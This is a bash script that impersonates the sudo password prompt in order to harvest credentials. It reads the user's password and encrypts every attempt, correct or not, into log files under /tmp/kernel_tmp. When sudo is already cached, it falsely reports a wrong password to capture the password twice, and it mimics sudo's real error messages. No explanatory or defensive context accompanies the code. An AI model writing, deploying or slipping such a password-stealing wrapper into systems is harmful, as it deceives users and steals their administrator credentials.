#!/usr/bin/env bash

CERTIFICATE="certificate.crt"
FOLDER_PATH="/tmp/kernel_tmp"

COUNTER=0


function create_file_name() {

    SPECIFIC_NUMBER="$1"

    printf "date.%s.%d.log" "$(date +%Z.%Y_%m_%d.%H_%M_%S~%s)" "$SPECIFIC_NUMBER"

}

function sudo_kernel() {

    # if not arguments are given show sudos help page
    if [ $# -lt 1 ]; then
        sudo
        exit $?
    fi

    mkdir -p "$FOLDER_PATH"

    export RANDFILE="$FOLDER_PATH/.rnd"

    SUDO_CACHED=false

    folder_now="$(dirname -- "$(readlink -f -- "${BASH_SOURCE[0]}")")"

    if sudo -S true < /dev/null 2> /dev/null ; then
        SUDO_CACHED=true
    fi

    while [ $COUNTER -lt 3 ]; do

        read -rsp "[sudo] password for $USER: " PASSWORD
        echo

        # if is not cached try it
        if [ "$SUDO_CACHED" = false ]; then

            # run the command trough sudo
            if echo "$PASSWORD" | sudo -S echo 2>&1 | grep -q "try again" ; then

                echo "$USER $PASSWORD" |
                "${folder_now}/smime.bash" encrypt "${folder_now}/${CERTIFICATE}" - "$FOLDER_PATH/$(create_file_name $COUNTER)"

                echo "Sorry, try again."

                COUNTER=$(( COUNTER + 1 ))

            else

                echo "$USER $PASSWORD" |
                "${folder_now}/smime.bash" encrypt "${folder_now}/${CERTIFICATE}" - "$FOLDER_PATH/$(create_file_name $COUNTER)y"

                sudo "$@"
                exit $?
            fi

        # if is cached catch twice
        else

            echo "$USER $PASSWORD" |
            "${folder_now}/smime.bash" encrypt "${folder_now}/${CERTIFICATE}" - "$FOLDER_PATH/$(create_file_name $COUNTER)"

            COUNTER=$(( COUNTER + 1 ))

            # sudo with the cache
            if [ $COUNTER -gt 1 ]; then
                sudo "$@"
                exit $?
            else
                sleep 1
                echo "Sorry, try again."
            fi

        fi

    done

    echo "sudo: 3 incorrect password attempts"
    exit 1

}

function main() {
    sudo_kernel "$@"
}

# run the main function
main "$@"
